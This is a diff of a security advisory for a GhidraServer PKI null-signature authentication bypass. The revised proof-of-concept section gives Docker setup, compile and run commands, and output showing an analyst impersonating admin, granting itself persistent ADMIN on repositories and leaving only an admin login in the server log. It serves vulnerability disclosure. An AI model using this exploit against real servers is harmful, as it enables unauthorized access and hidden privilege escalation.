@@ -1,4 +1,4 @@
-# GhidraServer PKI Privilege Escalation: Null Signature Bypasses Identity Verification
+# GhidraServer PKI User Impersonation via Null Signature
 
 ### Summary
 
@@ -49,59 +49,40 @@ The attacker completes mTLS with their own certificate (proving they hold *their
 ### PoC
 
 **Prerequisites:**
-- GhidraServer 12.0.4 (or earlier) running in PKI mode (`-a2`)
-- JDK 17+
-- Ghidra installation (for library JARs on the classpath)
-- Attacker's PKCS12 keystore containing their own certificate + private key, signed by a CA the server trusts
-- Target user's public certificate file (PEM format) — private key **not** needed
+- Docker and Docker Compose (to spin up a test GhidraServer)
+- A local Ghidra installation (for compiling and running the exploit)
 
-**Setup — Docker Compose (self-contained):**
+**Initial state — admin-only repository:**
 
-```bash
-docker compose up -d
-```
+The Docker image in `poc/docker/` bundles GhidraServer with a complete PKI hierarchy. On first boot, the container:
+1. Generates a PKI hierarchy: CA, `admin` cert/key, `analyst` cert/key, `server` cert/key
+2. Registers two users: `admin` (DN: `CN=admin,O=GhidraDemo,C=US`) and `analyst` (DN: `CN=analyst,O=GhidraDemo,C=US`)
+3. Creates `SecretAnalysis` — a repository with an admin-only ACL. The `analyst` user has no ACL entry and cannot see the repository
 
-The Docker image generates a complete PKI hierarchy:
-- `pki/ca.crt` — Certificate Authority
-- `pki/admin.crt`, `pki/admin.p12` — Admin user (the impersonation target)
-- `pki/user.crt`, `pki/user.p12` — Regular analyst (the attacker)
-- `pki/server.p12` — GhidraServer identity
-
-Two users are pre-registered: `admin` (DN: `CN=admin,O=GhidraDemo,C=US`) and `analyst` (DN: `CN=analyst,O=GhidraDemo,C=US`).
-
-**Setup — existing GhidraServer:**
-
-If targeting an existing server, the attacker needs:
-1. Their own PKCS12 keystore (issued by the same CA the server trusts)
-2. The target user's public certificate (obtainable from LDAP, email, etc.)
-3. The CA certificate
-
-**Run the exploit:**
+**Start the server:**
 
 ```bash
-# Compile against Ghidra's libraries
-GHIDRA_HOME=/path/to/ghidra
-CP="."
-for jar in $(find "$GHIDRA_HOME/Ghidra" -name "*.jar" \
-    \( -path "*/GhidraServer/*" -o -path "*/FileSystem/*" -o -path "*/DB/*" \
-       -o -path "*/Generic/*" -o -path "*/Utility/*" -o -path "*/Docking/*" \
-       -o -path "*/Help/*" -o -path "*/Gui/*" \) | sort); do
-    CP="$CP:$jar"
-done
-
-javac -cp "$CP" Poc.java
-
-# Run — analyst impersonates admin
-java -cp "$CP" -Dghidra.cacerts=pki/ca.crt Poc \
-    --target-cert pki/admin.crt \
-    --user-key pki/user.p12 \
-    --password changeit \
-    --ca-cert pki/ca.crt \
-    --host localhost \
-    --port 13100
+cd poc/docker
+docker compose up --build -d
 ```
 
-**Expected output:**
+**Run the demo:**
+
+```bash
+cd poc
+export GHIDRA_HOME=/path/to/ghidra_12.0.4_PUBLIC
+export PKI_DIR="$PWD/docker/pki"
+export HOST=localhost
+bash demo.sh
+```
+
+`demo.sh` compiles `Poc.java` on the first run and executes the three steps below.
+
+---
+
+**Step 1 — Analyst checks access (before exploit)**
+
+The analyst authenticates with their own legitimate certificate and private key. They are not in the `SecretAnalysis` ACL and see nothing:
 
 ```
 ========================================================================
@@ -109,20 +90,38 @@ java -cp "$CP" -Dghidra.cacerts=pki/ca.crt Poc \
 ========================================================================
 
   Target server:   localhost:13100
-  Attacker cert:   CN=analyst, O=GhidraDemo, C=US
-  Target cert:     CN=admin, O=GhidraDemo, C=US
+  User cert:       CN=analyst, O=GhidraDemo, C=US
   CA:              CN=DemoCA, O=GhidraDemo, C=US
+  Mode:            Normal authentication
 
-[1] Connecting to RMI registry over mTLS...
-    mTLS client cert: CN=analyst, O=GhidraDemo, C=US
-[2] Looking up GhidraServer9.0...
-    Got server handle (mTLS handshake succeeded)
-[3] Requesting authentication callbacks...
-    Received SignatureCallback with 64-byte token
-[4] EXPLOIT: sigCb.sign(targetCertChain, null)
-    Certificate chain: CN=admin, O=GhidraDemo, C=US
-    Signature:         null  (verification will be SKIPPED)
-[5] Calling getRepositoryServer()...
+========================================================================
+ CONNECTED — AUTHENTICATED AS: analyst
+========================================================================
+
+  Server users (2):
+    - admin
+    - analyst
+  Repositories (0):
+
+========================================================================
+```
+
+---
+
+**Step 2 — Run exploit (null-signature impersonation + ACL rewrite)**
+
+The analyst presents admin's public certificate with a null signature. The server skips verification and authenticates the session as `admin`. The exploit then calls `setUserList()` to add `analyst` as `ADMIN` on every repository:
+
+```
+========================================================================
+ GhidraServer PKI Privilege Escalation — Null Signature Bypass
+========================================================================
+
+  Target server:   localhost:13100
+  User cert:       CN=analyst, O=GhidraDemo, C=US
+  CA:              CN=DemoCA, O=GhidraDemo, C=US
+  Target cert:     CN=admin, O=GhidraDemo, C=US
+  Mode:            EXPLOIT + ESCALATE (null signature bypass)
 
 ========================================================================
  EXPLOIT SUCCEEDED — AUTHENTICATED AS: admin
@@ -135,9 +134,110 @@ java -cp "$CP" -Dghidra.cacerts=pki/ca.crt Poc \
   Server users (2):
     - admin
     - analyst
+
+────────────────────────────────────────────────────────────────────────
+ ESCALATION: Granting attacker persistent ADMIN access
+────────────────────────────────────────────────────────────────────────
+
+[E1] Determining attacker's real server username...
+     Attacker username: analyst
+
+[E3] Escalating attacker on 1 repository(ies)...
+
+     Repository: SecretAnalysis
+     Current ACL:
+       admin (admin)
+     Updated ACL:
+       admin (admin)
+       analyst (admin)
+
+────────────────────────────────────────────────────────────────────────
+ VERIFICATION: Attacker authenticating with own credentials
+────────────────────────────────────────────────────────────────────────
+
+  (Normal authentication — no exploit, using attacker's own
+   certificate and private key to prove this persists)
+
+  Authenticated as: analyst (normal login, no exploit)
+  Accessible repositories (1):
+    - SecretAnalysis [analyst (admin)]
+
+========================================================================
+ ESCALATION COMPLETE
+========================================================================
+
+  Attacker 'analyst' now has ADMIN on all repos.
+  This access is PERSISTENT — it survives server restarts
+  and does not require further exploitation.
+========================================================================
 ```
 
-The server log shows `User 'admin' authenticated` — indistinguishable from a legitimate admin login.
+---
+
+**Step 3 — Analyst checks access (after exploit)**
+
+The analyst authenticates normally — no exploit, their own certificate and private key. The ACL rewrite persists on disk and the analyst now sees `SecretAnalysis`:
+
+```
+========================================================================
+ GhidraServer PKI Privilege Escalation — Null Signature Bypass
+========================================================================
+
+  Target server:   localhost:13100
+  User cert:       CN=analyst, O=GhidraDemo, C=US
+  CA:              CN=DemoCA, O=GhidraDemo, C=US
+  Mode:            Normal authentication
+
+========================================================================
+ CONNECTED — AUTHENTICATED AS: analyst
+========================================================================
+
+  Server users (2):
+    - admin
+    - analyst
+  Repositories (1):
+    - SecretAnalysis
+
+========================================================================
+```
+
+The GhidraServer log shows `User 'admin' authenticated` for the exploit session — indistinguishable from a legitimate admin login. The analyst's identity never appears in the server log until they subsequently log in with their own credentials.
+
+---
+
+**Manual invocation (without demo.sh):**
+
+Compile `Poc.java` locally against Ghidra's libraries, then run against the Docker container (or any GhidraServer host):
+
+```bash
+cd poc
+GHIDRA_HOME=/path/to/ghidra_PUBLIC
+PKI_DIR=docker/pki
+CP="."
+for jar in $(find "$GHIDRA_HOME/Ghidra" -name "*.jar" \
+    \( -path "*/GhidraServer/*" -o -path "*/FileSystem/*" -o -path "*/DB/*" \
+       -o -path "*/Generic/*" -o -path "*/Utility/*" -o -path "*/Docking/*" \
+       -o -path "*/Help/*" -o -path "*/Gui/*" \) | sort); do
+    CP="$CP:$jar"
+done
+javac -cp "$CP" Poc.java
+
+# Check access before exploit (normal auth — no --target-cert)
+java -cp "$CP" -Dghidra.cacerts="$PKI_DIR/cacerts" Poc \
+    --host     localhost --port 13100 \
+    --user-key "$PKI_DIR/user.p12" \
+    --ca-cert  "$PKI_DIR/ca.crt" \
+    --password changeit
+
+# Run exploit (null-signature impersonation + persistent ADMIN escalation)
+java -cp "$CP" -Dghidra.cacerts="$PKI_DIR/cacerts" Poc \
+    --host        localhost \
+    --port        13100 \
+    --target-cert "$PKI_DIR/admin.crt" \
+    --user-key    "$PKI_DIR/user.p12" \
+    --ca-cert     "$PKI_DIR/ca.crt" \
+    --password    changeit
+```
 
 ### Impact
 
